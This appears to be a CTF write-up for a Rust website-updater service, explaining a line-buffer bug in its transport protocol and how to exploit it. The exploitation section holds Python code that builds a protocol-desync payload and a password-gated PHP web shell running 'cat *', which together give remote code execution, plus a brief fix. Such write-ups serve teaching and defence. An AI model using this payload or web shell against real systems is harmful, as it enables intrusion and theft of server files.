# The Startup Service

The service is an engine for updating the content of dynamic website. The content can be download from any untrusted mirror-like site, but its authencity is checked using Ed25519 digital signature scheme.

The service is written in Rust. The site that updated is a usual PHP site.

There are two main parts in the updater:

1. The client handler that gets a manifest and its signature from the client, creates a task, downloads files and checks its signatures. The manifest is a json-data, that describes files and their hashsums. 
The example of manifest:
```
{
    "links": [
        {"url": "http://mirror/wyjzmw.php", "checksum": "32bfce7a147d2fb0c87ff234c2848a37"},
        {"url": "http://mirror/JhXY.php", "checksum": "d55ec508be338092ab591f3d7e4ab929"}
    ]
}
```

2. Transport handlers that download a file, compute hashsums and send that data to the client handler. Supported transports are HTTP and HTTP/2. The handlers are launched by the client handler as programs, the communication between them is done by using standard I/O streams: stdin and stdout.

## The Protocol Between the Client Handler and the Transport Handler ##

1. The client handler sends an url to download as a line to stdin of transport handler.
2. The transport handler gets the data and sends an about it to the stdout in the following format:
```
Url: http://<url>
Success: [true or false]
Hashsum: <hashsum>
Content-Length: <integer>
<data>
```
3. Go to step 1.

On the program level the updater communicates with the transport handler using the AsyncBufferedReadStream class. It has methods *read_line()* and *read(n)* to get next line and next data chunk. Also it mantains an internal buffer of length 1024 to store the extra data readed from the socket.

# The Vulnerability #

The *read_line()* can never return the data that is bigger than buffer. If the line is longer then 1024 bytes, the first 1024 bytes are returned as single line, but the rest of the data is returned as another line. Moreover, if the several lines are read with a single syscall, the last line can be truncated. That can be used to unsynchronize the protocol and inject false answers to the client handler request that contains arbitrary data with arbitrary checksums.

This allows to make the client hadler save the PHP-file with content provided by attacker, effectively giving an RCE.

# The Exploitation #

It is supposed that the attacker has a manifest and knows the digital signature of some innocent data. Both can be obtained from the checker using a sniffer

To exploit the vulnerability the attacker needs a way to inject long strings to the protocol. It controls the URL host part and data. The one way how it can be done is to provide the hostname into the following format: <host>:<000000><port>, where <000000> is arbitrary number of "0" characters. That port will be interpreted as usual number.

Here is a code to generate the payload, that should be send as an answer on HTTP or HTTP/2 request:

```python
MYIP = "10.60.30.1"
MYPORT = "0" * (921-len(MYIP)) + "4000"

FAKE_PHP = br"""<?php if($_GET["key"]=="KnfSM")system("cat *")?>"""

PAYLOAD = b"""AAAAAA
Url: http://%s:%s/JhXY.php
Success: true
Hashsum: d55ec508be338092ab591f3d7e4ab929\n\n\n\n\n\n\n\n\n\n
Content-Length: %d
%s""" % (MYIP.encode(), MYPORT.encode(), len(FAKE_PHP), FAKE_PHP)

ANS = b"""HTTP/1.1 200 OK
Content-Length: %d

%s?>""" % (len(PAYLOAD), PAYLOAD)
```

###How it works?###

On the first request this answer is passed from the transport handler to the client handler:

```
Url http://10.60.30.1:000000...04000/somename.php
Success: true
Hashsum: d55ec508be338092ab591f3d7e4ab929
Content-Length: 1000
<data>
```

The client client handler interprets it as

```
Url http://10.60.30.1:000000...04000/somename.php
Success: true
Hashsum: d55ec508be338092ab591f3d7e4ab929
Content-Length: 10
00
<data>
```

So the first two zeroes and few first bytes of data are interpreted as an answer on first request. So the further data will be interpreted by client handler as the next request answer. The attacker is injecting fake hashsum and fake data there:

```
Url: http://%s:%s/JhXY.php
Success: true
Hashsum: d55ec508be338092ab591f3d7e4ab929
Content-Length: <len>
<?php if($_GET["key"]=="KnfSM")system("cat *")?>
```

The full sploit can be found at [/exploits/startup/startup_sploit.py](../exploits/startup/startup_sploit.py).

**The fix.** To fix the vuln the buffering algorithm should be modified to work with longer strings.

